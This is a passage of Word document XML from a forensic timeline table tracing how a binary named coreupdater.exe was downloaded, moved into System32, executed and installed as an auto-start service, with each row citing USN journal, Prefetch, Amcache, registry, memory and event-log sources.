              </w:rPr>
              <w:t>USN $J</w:t>
              <w:br/>
              <w:t>F:\Users\Administrator\Downloads\coreupdater.exe</w:t>
              <w:br/>
              <w:t>RenameNewName|Close [Archive] entry=26213-4</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_usnjrnl/usnjrnl.csv#35889</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\$Extend\$J</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-008, F-029</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:40:00.863618</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$UsnJrnl:$J</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>USN $J</w:t>
              <w:br/>
              <w:t>F:\Users\Administrator\Downloads\coreupdater.exe.b1jhvkh.partial</w:t>
              <w:br/>
              <w:t>NamedDataExtend|StreamChange [Archive] entry=26213-4</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_usnjrnl/usnjrnl.csv#35876</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\$Extend\$J</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-029</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:40:09</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Windows Timeline (ActivitiesCache)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Activity: start ; Activity: end ; Activity: last modified</w:t>
              <w:br/>
              <w:t>Microsoft.Windows.Explorer</w:t>
              <w:br/>
              <w:t>type=CopyPaste</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>wxtcmd/F/Users/Administrator/AppData/Local/ConnectedDevicesPlatform/L.Administrator/20261025201827_Administrator_Activity.csv#11</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Users\Administrator\AppData\Local\ConnectedDevicesPlatform\L.Administrator\ActivitiesCache.db</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-027</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:40:42.254194</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$UsnJrnl:$J</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>USN $J</w:t>
              <w:br/>
              <w:t>F:\Windows\System32\coreupdater.exe</w:t>
              <w:br/>
              <w:t>RenameNewName [Archive] entry=26213-4</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_usnjrnl/usnjrnl.csv#35942</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\$Extend\$J</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-008, F-027, F-029, T-006, T-020</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:40:45.191906</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Amcache (files)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Amcache: file key written (≈ first execution / presence)</w:t>
              <w:br/>
              <w:t>c:\windows\system32\coreupdater.exe</w:t>
              <w:br/>
              <w:t>coreupdater.exe SHA1=fd153c66386ca93ec9993d66a84d6f0d129a3a5c compiled=2010-04-14 22:06:53.0000000 app=Unassociated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>amcacheparser/20261025201808_Amcache_UnassociatedFileEntries.csv#2</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\AppCompat\Programs\Amcache.hve</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-008, F-011, F-012, F-017, I-002</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:40:49</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Memory: process scan (psscan)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>process created (memory, psscan)</w:t>
              <w:br/>
              <w:t>coreupdater.ex</w:t>
              <w:br/>
              <w:t>PID=8324 | PPID=4008 | ImageFileName=coreupdater.ex | SessionId=3</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>volatility/windows.psscan.PsScan.jsonl#167</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Sleuthline\cases\test04\memory\DESKTOP-SDN1RPT.mem</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-008, F-012, F-032, T-007, T-027</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:40:49</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Memory: process list (pslist)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>process created (memory, pslist)</w:t>
              <w:br/>
              <w:t>coreupdater.ex</w:t>
              <w:br/>
              <w:t>PID=8324 | PPID=4008 | ImageFileName=coreupdater.ex | SessionId=3 | Threads=0</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>volatility/windows.pslist.PsList.jsonl#50</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>C:\Sleuthline\cases\test04\memory\DESKTOP-SDN1RPT.mem</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-015</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:40:49.317328</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>$UsnJrnl:$J</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>USN $J</w:t>
              <w:br/>
              <w:t>F:\Windows\System32\coreupdater.exe</w:t>
              <w:br/>
              <w:t>StreamChange [Archive] entry=26213-4</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>mftecmd_usnjrnl/usnjrnl.csv#36064</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\$Extend\$J</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-029, T-023</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:40:49.347000</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: UserAssist</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Execution (UserAssist, last)</w:t>
              <w:br/>
              <w:t>{System}\coreupdater.exe</w:t>
              <w:br/>
              <w:t>runs=1 focus=0 focus_time=0d, 0h, 00m, 00s</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/20261025191813/recmd_kroll_F_UserAssist.csv#39</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-012</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:40:49.410320</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Prefetch</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Execution (Prefetch, last)</w:t>
              <w:br/>
              <w:t>COREUPDATER.EXE</w:t>
              <w:br/>
              <w:t>runs=1 hash=157C54BB False</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>pecmd/prefetch_0.csv#22</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\prefetch\COREUPDATER.EXE-157C54BB.pf</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-008, F-012, T-007</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:41:06.504000</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: UserAssist</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Execution (UserAssist, last)</w:t>
              <w:br/>
              <w:t>{System}\cmd.exe</w:t>
              <w:br/>
              <w:t>runs=1 focus=1 focus_time=0d, 0h, 03m, 35s</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>recmd_kroll/20261025191813/recmd_kroll_F_UserAssist.csv#41</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-012, T-011</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:42:38</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Windows Timeline (ActivitiesCache)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Activity: start ; Activity: end ; Activity: last modified</w:t>
              <w:br/>
              <w:t>System\cmd.exe</w:t>
              <w:br/>
              <w:t>type=CopyPaste</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>wxtcmd/F/Users/Administrator/AppData/Local/ConnectedDevicesPlatform/L.Administrator/20261025201827_Administrator_Activity.csv#15</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Users\Administrator\AppData\Local\ConnectedDevicesPlatform\L.Administrator\ActivitiesCache.db</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-027</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:42:41</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Windows Timeline (ActivitiesCache)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Activity: start ; Activity: end ; Activity: last modified</w:t>
              <w:br/>
              <w:t>System\cmd.exe</w:t>
              <w:br/>
              <w:t>type=CopyPaste</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>wxtcmd/F/Users/Administrator/AppData/Local/ConnectedDevicesPlatform/L.Administrator/20261025201827_Administrator_Activity.csv#16</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Users\Administrator\AppData\Local\ConnectedDevicesPlatform\L.Administrator\ActivitiesCache.db</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-027</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:42:42.660809</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Prefetch</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Execution (Prefetch, last)</w:t>
              <w:br/>
              <w:t>SC.EXE</w:t>
              <w:br/>
              <w:t>runs=1 hash=6C4D4413 False</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>pecmd/prefetch_0.csv#125</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F:\Windows\prefetch\SC.EXE-6C4D4413.pf</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>F-012, T-011</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1814"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2020-09-19 03:42:42.676537</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Event logs (EVTX)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="5669"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>EVTX event</w:t>
              <w:br/>
              <w:t>C:\Windows\System32\coreupdater.exe</w:t>
              <w:br/>
              <w:t>System 7045 | Service Control Manager | A new service was installed in the system | Name: coreupdater | StartType: auto start | Account: LocalSystem | C:\Windows\System32\coreupdater.exe</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2438"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>evtxecmd/evtxecmd_0.csv#40866</w:t>
            </w:r>
          </w:p>
